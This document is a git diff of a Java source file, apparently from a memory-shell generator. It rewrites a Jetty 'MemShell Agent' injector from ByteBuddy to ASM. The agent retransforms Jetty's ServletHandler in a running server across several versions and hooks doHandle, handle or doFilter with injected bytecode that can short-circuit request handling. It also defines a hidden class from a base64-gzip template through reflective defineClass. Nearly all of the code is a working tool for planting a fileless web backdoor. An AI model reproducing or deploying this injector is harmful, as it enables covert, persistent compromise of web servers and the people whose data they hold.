@@ -1,39 +1,37 @@
 package com.reajason.javaweb.memshell.injector.jetty;
 
-import net.bytebuddy.agent.builder.AgentBuilder;
-import net.bytebuddy.asm.Advice;
-import net.bytebuddy.description.type.TypeDescription;
-import net.bytebuddy.dynamic.DynamicType;
-import net.bytebuddy.matcher.ElementMatchers;
-import net.bytebuddy.utility.JavaModule;
+import org.objectweb.asm.*;
 
+import java.io.ByteArrayInputStream;
+import java.io.ByteArrayOutputStream;
+import java.lang.instrument.ClassFileTransformer;
 import java.lang.instrument.Instrumentation;
 import java.security.ProtectionDomain;
-
-import static net.bytebuddy.matcher.ElementMatchers.named;
+import java.util.Arrays;
+import java.util.List;
+import java.util.zip.GZIPInputStream;
 
 /**
  * @author ReaJason
- * @since 2024/12/28
+ * @since 2025/3/26
  */
-public class JettyHandlerAgentInjector implements AgentBuilder.Transformer {
+public class JettyHandlerAgentInjector implements ClassFileTransformer {
+    private static final List<String> TARGET_CLASSES = Arrays.asList(
+            "org/eclipse/jetty/servlet/ServletHandler",
+            "org/eclipse/jetty/ee8/servlet/ServletHandler",
+            "org/eclipse/jetty/ee9/servlet/ServletHandler",
+            "org/eclipse/jetty/ee10/servlet/ServletHandler$Chain",
+            "org/mortbay/jetty/servlet/ServletHandler"
+    );
+    private static String targetClassName = "";
+    private static String targetMethodName = "doHandle";
 
-    static Class<?> interceptorClass = null;
-
-    static {
-        try {
-            interceptorClass = Class.forName(getClassName());
-        } catch (ClassNotFoundException e) {
-            e.printStackTrace();
-        }
+    public static String getClassName() {
+        return "{{advisorName}}";
     }
 
-    @Override
-    public DynamicType.Builder<?> transform(DynamicType.Builder<?> builder,
-                                            TypeDescription typeDescription,
-                                            ClassLoader classLoader, JavaModule module,
-                                            ProtectionDomain protectionDomain) {
-        return builder.visit(Advice.to(interceptorClass).on(named("doHandle")));
+    public static String getBase64String() {
+        return "{{base64String}}";
     }
 
     public static void premain(String args, Instrumentation inst) throws Exception {
@@ -44,21 +42,256 @@ public class JettyHandlerAgentInjector implements AgentBuilder.Transformer {
         launch(inst);
     }
 
-    public static String getClassName() {
-        return "{{advisorName}}";
-    }
-
     private static void launch(Instrumentation inst) throws Exception {
         System.out.println("MemShell Agent is starting");
-        new AgentBuilder.Default()
-                .ignore(ElementMatchers.none())
-                .disableClassFormatChanges()
-                .with(AgentBuilder.RedefinitionStrategy.REDEFINITION)
-//                .with(AgentBuilder.Listener.StreamWriting.toSystemError().withErrorsOnly())
-//                .with(AgentBuilder.Listener.StreamWriting.toSystemOut().withTransformationsOnly())
-                .type(named("org.eclipse.jetty.servlet.ServletHandler"))
-                .transform(new JettyHandlerAgentInjector())
-                .installOn(inst);
-        System.out.println("MemShell Agent is working at org.eclipse.jetty.servlet.ServletHandler.doHandle");
+        inst.addTransformer(new JettyHandlerAgentInjector(), true);
+        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
+            String name = allLoadedClass.getName();
+            for (String targetClass : TARGET_CLASSES) {
+                if (targetClass.replace("/", ".").equals(name)) {
+                    targetClassName = name;
+                    if (targetClassName.contains("mortbay")) {
+                        targetMethodName = "handle";
+                    }
+                    if (targetClassName.contains("ee10")) {
+                        targetMethodName = "doFilter";
+                    }
+                    inst.retransformClasses(allLoadedClass);
+                    System.out.println("MemShell Agent is working at " + targetClassName + "." + targetMethodName);
+                }
+            }
+        }
+    }
+
+    @Override
+    @SuppressWarnings("all")
+    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
+                            ProtectionDomain protectionDomain, byte[] bytes) {
+        if (TARGET_CLASSES.contains(className)) {
+            if (className.contains("mortbay")) {
+                targetMethodName = "handle";
+            }
+            if (className.contains("ee10")) {
+                targetMethodName = "doFilter";
+            }
+            defineTargetClass(loader);
+            try {
+                ClassReader cr = new ClassReader(bytes);
+                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
+                    @Override
+                    protected ClassLoader getClassLoader() {
+                        return loader;
+                    }
+                };
+                ClassVisitor cv = getClassVisitor(cw);
+                cr.accept(cv, ClassReader.EXPAND_FRAMES);
+                return cw.toByteArray();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        return bytes;
+    }
+
+    @SuppressWarnings("all")
+    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
+        return new ClassVisitor(Opcodes.ASM9, cv) {
+            @Override
+            public MethodVisitor visitMethod(int access, String name, String descriptor,
+                                             String signature, String[] exceptions) {
+                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
+                if (targetMethodName.equals(name)) {
+                    try {
+                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
+                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
+                    } catch (Exception e) {
+                        e.printStackTrace();
+                    }
+                }
+                return mv;
+            }
+        };
+    }
+
+    public static class AgentShellMethodVisitor extends MethodVisitor {
+        private final Type[] argumentTypes;
+        private final String className;
+
+        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className) {
+            super(Opcodes.ASM9, mv);
+            this.argumentTypes = argTypes;
+            this.className = className;
+        }
+
+        @Override
+        public void visitCode() {
+            loadArgArray();
+            Label tryStart = new Label();
+            Label tryEnd = new Label();
+            Label catchHandler = new Label();
+            Label ifConditionFalse = new Label();
+            Label skipCatchBlock = new Label();
+            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");
+
+            mv.visitLabel(tryStart);
+            String internalClassName = className.replace('.', '/');
+            mv.visitTypeInsn(Opcodes.NEW, internalClassName);
+            mv.visitInsn(Opcodes.DUP);
+            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, internalClassName, "<init>", "()V", false);
+            mv.visitInsn(Opcodes.SWAP);
+            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
+                    "java/lang/Object",
+                    "equals",
+                    "(Ljava/lang/Object;)Z",
+                    false);
+            mv.visitJumpInsn(Opcodes.IFEQ, ifConditionFalse);
+            mv.visitInsn(Opcodes.RETURN);
+            mv.visitLabel(ifConditionFalse);
+            mv.visitLabel(tryEnd);
+            mv.visitJumpInsn(Opcodes.GOTO, skipCatchBlock);
+            mv.visitLabel(catchHandler);
+            mv.visitInsn(Opcodes.POP);
+            mv.visitLabel(skipCatchBlock);
+        }
+
+        public void loadArgArray() {
+            mv.visitIntInsn(Opcodes.SIPUSH, argumentTypes.length);
+            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
+            for (int i = 0; i < argumentTypes.length; i++) {
+                mv.visitInsn(Opcodes.DUP);
+                push(i);
+                Type argumentType = argumentTypes[i];
+                mv.visitVarInsn(argumentType.getOpcode(Opcodes.ILOAD), getArgIndex(i));
+                boxPrimitive(mv, argumentType);
+                mv.visitInsn(Type.getType(Object.class).getOpcode(Opcodes.IASTORE));
+            }
+        }
+
+        @SuppressWarnings("all")
+        public void push(final int value) {
+            if (value >= -1 && value <= 5) {
+                mv.visitInsn(Opcodes.ICONST_0 + value);
+            } else if (value >= Byte.MIN_VALUE && value <= Byte.MAX_VALUE) {
+                mv.visitIntInsn(Opcodes.BIPUSH, value);
+            } else if (value >= Short.MIN_VALUE && value <= Short.MAX_VALUE) {
+                mv.visitIntInsn(Opcodes.SIPUSH, value);
+            } else {
+                mv.visitLdcInsn(new Integer(value));
+            }
+        }
+
+        private void boxPrimitive(MethodVisitor mv, Type type) {
+            if (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) {
+                return; // Already an object
+            }
+
+            String owner;
+            String descriptor;
+
+            switch (type.getSort()) {
+                case Type.BOOLEAN:
+                    owner = "java/lang/Boolean";
+                    descriptor = "(Z)Ljava/lang/Boolean;";
+                    break;
+                case Type.CHAR:
+                    owner = "java/lang/Character";
+                    descriptor = "(C)Ljava/lang/Character;";
+                    break;
+                case Type.BYTE:
+                    owner = "java/lang/Byte";
+                    descriptor = "(B)Ljava/lang/Byte;";
+                    break;
+                case Type.SHORT:
+                    owner = "java/lang/Short";
+                    descriptor = "(S)Ljava/lang/Short;";
+                    break;
+                case Type.INT:
+                    owner = "java/lang/Integer";
+                    descriptor = "(I)Ljava/lang/Integer;";
+                    break;
+                case Type.FLOAT:
+                    owner = "java/lang/Float";
+                    descriptor = "(F)Ljava/lang/Float;";
+                    break;
+                case Type.LONG:
+                    owner = "java/lang/Long";
+                    descriptor = "(J)Ljava/lang/Long;";
+                    break;
+                case Type.DOUBLE:
+                    owner = "java/lang/Double";
+                    descriptor = "(D)Ljava/lang/Double;";
+                    break;
+                default:
+                    // Should not happen for primitive types
+                    return;
+            }
+            mv.visitMethodInsn(Opcodes.INVOKESTATIC, owner, "valueOf", descriptor, false);
+        }
+
+        private int getArgIndex(final int arg) {
+            int index = 1;
+            for (int i = 0; i < arg; i++) {
+                index += argumentTypes[i].getSize();
+            }
+            return index;
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] decodeBase64(String base64Str) {
+        Class<?> decoderClass;
+        try {
+            decoderClass = Class.forName("java.util.Base64");
+            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
+        } catch (Exception ignored) {
+            try {
+                decoderClass = Class.forName("sun.misc.BASE64Decoder");
+                return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
+            } catch (Exception e) {
+                throw new RuntimeException(e);
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public static byte[] gzipDecompress(byte[] compressedData) {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        GZIPInputStream gzipInputStream = null;
+        try {
+            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
+            byte[] buffer = new byte[4096];
+            int n;
+            while ((n = gzipInputStream.read(buffer)) > 0) {
+                out.write(buffer, 0, n);
+            }
+            return out.toByteArray();
+        } catch (Exception e) {
+            throw new RuntimeException(e);
+        } finally {
+            try {
+                if (gzipInputStream != null) {
+                    gzipInputStream.close();
+                }
+                out.close();
+            } catch (Exception ignored) {
+            }
+        }
+    }
+
+    @SuppressWarnings("all")
+    public void defineTargetClass(ClassLoader loader) {
+        try {
+            loader.loadClass(getClassName());
+            return;
+        } catch (ClassNotFoundException ignored) {
+        }
+        byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
+        try {
+            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
+        } catch (Exception ignored) {
+        }
     }
 }
